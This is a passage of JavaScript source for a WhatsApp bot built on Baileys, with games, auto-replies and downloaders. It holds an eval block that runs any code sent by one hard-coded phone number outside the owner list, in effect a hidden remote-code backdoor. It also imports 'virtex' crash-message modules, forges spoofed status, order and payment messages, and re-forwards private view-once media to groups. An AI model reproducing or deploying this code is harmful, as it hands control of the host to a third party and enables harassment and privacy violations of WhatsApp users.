require('./settings')
require('./lib/listmenu')
const { modul } = require('./module');
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl } = modul;
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = baileys
const { clockString, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture } = require('./lib/myfunc')
const { color, bgcolor } = require('./lib/color')
const { buttonkal } = require('./kbug/virtex/buttonkal')
const { rentfromTzy, conns } = require('./RentBot')
const { uptotelegra } = require('./scrape/upload')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./scrape/uploader')
const { dafontSearch, dafontDown } = require('./scrape/dafont')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess')
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const ffstalk = require('./scrape/ffstalk')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const mlstalk = require('./scrape/mlstalk')
const textpro = require('./scrape/textpro')
const photooxy = require('./scrape/photooxy')
const { ios1 } = require('./kbug/virtex/ios1.js')
const { zetsubonotgay } = require('./kbug/virtex/zetsubonotgay.js')

const { ios2 } = require('./kbug/virtex/ios2.js')
const yts = require('./scrape/yt-search')
const kirleys = require('@adiwajshing/baileys')
const vm = require('node:vm')
const mark = `0@s.whatsapp.net`
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const Tzyverifieduser = JSON.parse(fs.readFileSync('./database/user.json'))
const VoiceNoteTzy = JSON.parse(fs.readFileSync('./TzyMedia/database/Tzyvn.json'))
const StickerTzy = JSON.parse(fs.readFileSync('./TzyMedia/database/Tzysticker.json'))
const ImageTzy = JSON.parse(fs.readFileSync('./TzyMedia/database/Tzyimage.json'))
const VideoTzy = JSON.parse(fs.readFileSync('./TzyMedia/database/Tzyvideo.json'))
const BadTzy = JSON.parse(fs.readFileSync('./database/bad.json'))
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"))

let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'));
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'));
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'));
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'));
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'));
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'));
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'));
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'));
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'));
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'));
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'));
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'));

let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []

global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
...(global.db || {})
}

module.exports = yudamods = async (yudamods, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const gakbisaowner = `${ownernumber}@s.whatsapp.net`
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy = (typeof m.text == 'string' ? m.text : '')
        const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ''
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "No Name"
        const botNumber = await yudamods.decodeJid(yudamods.user.id)
        const TzyTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const TzyTheDeveloper = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await yudamods.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isPrem = prem.includes(m.sender)
    	const isContacts = contacts.includes(m.sender)
    	const isUser = Tzyverifieduser.includes(sender)
    	const banUser = await yudamods.fetchBlocklist()
        const isBanned = banUser ? banUser.includes(m.sender) : false
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>');
    
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : false
    
        //TIME
        const xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
        const xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
        const time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')  
         if(time2 < "23:59:00"){
var Tzyytimewisher = `Good Night 🌌`
 }
 if(time2 < "19:00:00"){
var Tzyytimewisher = `Good Evening 🌃`
 }
 if(time2 < "18:00:00"){
var Tzyytimewisher = `Good Evening 🌃`
 }
 if(time2 < "15:00:00"){
var Tzyytimewisher = `Good Afternoon 🌅`
 }
 if(time2 < "11:00:00"){
var Tzyytimewisher = `Good Morning 🌄`
 }
 if(time2 < "05:00:00"){
var Tzyytimewisher = `Good Morning 🌄`
 } 

		if (isEval && senderNumber == "6283842204546") {
			let evaled,
				text = q,
				{ inspect } = require('util');
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== 'string') evaled = inspect(evaled);
				await yudamods.sendMessage(from, { text: evaled }, { quoted: m });
			} catch (e) {
				yudamods.sendMessage(from, { text: String(e) }, { quoted: m });
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {}
if (user) {
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premium: false
}
} catch (err) {
console.error(err)
}

if (!yudamods.public) {
if (!m.key.fromMe) return
}

    const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser } = require('./database/register.js')
//chat counter (console log)
        if (m.message && m.isGroup) {
            yudamods.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Group Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(groupName, m.chat))
        } else {
            yudamods.readMessages([m.key])
            console.log(color(`\n< ================================================== >\n`, 'cyan'))
			console.log(color(`Private Chat:`, 'green'))
            console.log(chalk.black(chalk.bgWhite('[ MESSAGE ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender))
        }

if (isCmd && !isUser) {
Tzyverifieduser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(Tzyverifieduser, null, 2))
}

yudamods.sendPresenceUpdate('available', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Don't Tag Him!
He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

if (db.users[m.sender].afkTime > -1) {
let user = global.db.users[m.sender]
m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

//auto block pakistan number
if (m.sender.startsWith('212')) return yudamods.updateBlockStatus(m.sender, 'block')

async function sendyudamodsMessage(chatId, message, options = {}){
    let generate = await generateWAMessage(chatId, message, options)
    let type2 = getContentType(generate.message)
    if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
    if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
    return await yudamods.relayMessage(chatId, generate.message, { messageId: generate.key.id })
}
//group chat msg  by Fxyz
const replygcTzy2 = (teks) => {
yudamods.sendMessage(m.chat,
{ text: teks,
contextInfo:{
mentionedJid:[sender],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
"containsAutoReply": true,
"title": ` ${global.botname}`,
"body": `${ownername}`,
"previewType": "PHOTO",
"thumbnailUrl": ``,
"thumbnail": fs.readFileSync(`./TzyMedia/theme/cheemspic.jpg`),
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`}}},
{ quoted: m})
}
const replygcTzy = (teks) => {        
sendyudamodsMessage(from, { 
text: teks,
mentions:[sender],
contextInfo:{
forwardingScore: 9999999,
isForwarded: true, 
mentionedJid:[sender],
"externalAdReply": {
"showAdAttribution": true,
"renderLargerThumbnail": true,
"title": botname, 
"containsAutoReply": true,
"mediaType": 1, 
"thumbnail": defaultpp,
"mediaUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`,
"sourceUrl": `https://chat.whatsapp.com/JsXKjrkkd9NIXEb5cMKHWz`
}
}
})
}
const reply = (teks) => {
yudamods.sendMessage(from, { text: teks ,
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}
}, { quoted : m })
}

const sendSticker = (pesan) => {
yudamods.sendImageAsSticker(m.chat, pesan, m, { packname: global.packname, author: global.author })
}

try {
ppuser = await yudamods.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
defaultpp = await reSize(ppuser, 300, 300)

const sendvn = (teks) => {
yudamods.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}

//

        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        
//autoreply
        	const isRegistered = checkRegisteredUser(m.sender)
        //
for (let BhosdikaTzy of VoiceNoteTzy) {
if (budy === BhosdikaTzy) {
let audiobuffy = fs.readFileSync(`./TzyMedia/audio/${BhosdikaTzy}.mp3`)
yudamods.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaTzy of StickerTzy){
if (budy === BhosdikaTzy){
let stickerbuffy = fs.readFileSync(`./TzyMedia/sticker/${BhosdikaTzy}.webp`)
yudamods.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaTzy of ImageTzy){
if (budy === BhosdikaTzy){
let imagebuffy = fs.readFileSync(`./TzyMedia/image/${BhosdikaTzy}.jpg`)
yudamods.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaTzy of VideoTzy){
if (budy === BhosdikaTzy){
let videobuffy = fs.readFileSync(`./TzyMedia/video/${BhosdikaTzy}.mp4`)
yudamods.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

if (m.isGroup && m.mtype == 'viewOnceMessage') {
let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${m.sender.split("@")[0]}\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`
yudamods.sendMessage(m.chat, { text: teks, mentions: [m.sender] }, { quoted: m })
await sleep(500)
m.copyNForward(m.chat, true, {readViewOnce: true}, {quoted: m}).catch(_ => m.reply(`Maybe It's Opened`))
}

const lep = {
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }

const banRep = () => {
yudamods.sendMessage(m.chat, {
text:`Sorry you've been banned, please chat @${creator.split("@")[0]} to unban`,
mentions: [creator],
},
{
quoted:m
})
}

//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./TzyMedia/theme/cheemspic.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

if (isCmd && isBanned) {
return banRep()
}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await yudamods.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await yudamods.getName(i)}\nFN:${await yudamods.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

if (('family100'+from in _family100) && isCmd) {
kuis = true
let room = _family100['family100'+from]
let teks = budy.toLowerCase().replace(/[^\w\s\-]+/, '')
let isSurender = /^((me)?nyerah|surr?ender)$/i.test(m.text)
if (!isSurender) {
 let index = room.jawaban.findIndex(v => v.toLowerCase().replace(/[^\w\s\-]+/, '') === teks)
 if (room.terjawab[index]) return !0
 room.terjawab[index] = m.sender
}
let isWin = room.terjawab.length === room.terjawab.filter(v => v).length
let caption = `
Jawablah Pertanyaan Berikut :\n${room.soal}\n\n\nTerdapat ${room.jawaban.length} Jawaban ${room.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}
${isWin ? `Semua Jawaban Terjawab` : isSurender ? 'Menyerah!' : ''}
${Array.from(room.jawaban, (jawaban, index) => {
return isSurender || room.terjawab[index] ? `(${index + 1}) ${jawaban} ${room.terjawab[index] ? '@' + room.terjawab[index].split('@')[0] : ''}`.trim() : false
}).filter(v => v).join('\n')}
${isSurender ? '' : `Perfect Player`}`.trim()
yudamods.sendText(from, caption, m, { contextInfo: { mentionedJid: parseMention(caption) }}).then(mes => { return _family100['family100'+from].pesan = mesg }).catch(_ => _)
if (isWin || isSurender) delete _family100['family100'+from]
}

if (tebaklagu.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklagu[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
   yudamods.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lagu`}, {quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = kuismath[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 await m.reply(`🎮 Kuis Matematika  🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakgambar[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 yudamods.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Gambar`}, {quoted:m})
 delete tebakgambar[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkata[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 yudamods.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kata`}, {quoted:m})  
 delete tebakkata[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = caklontong[m.sender.split('@')[0]]
deskripsi = caklontong_desk[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 yudamods.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lontong 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebakkalimat[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 yudamods.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 yudamods.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Lirik`}, {quoted:m}) 
 delete tebaklirik[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
 yudamods.sendMessage(m.chat, { image: ppnyauser, caption: `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? Silahkan Ketik Tebak Tebakan`}, {quoted:m}) 
 delete tebaktebakan[m.sender.split('@')[0]]
} else m.reply('*Jawaban Salah!*')
}

function simpan(path, buff) {
    fs.writeFileSync(path, buff)
    return path
}
function getRandom(ext) {
    ext = ext || ""
    return `${Math.floor(Math.random() * 100000)}.${ext}`
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await yudamods.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await yudamods.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
m.reply(`${err}`)
}
}

const kalgans = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},

'message': {
 "stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
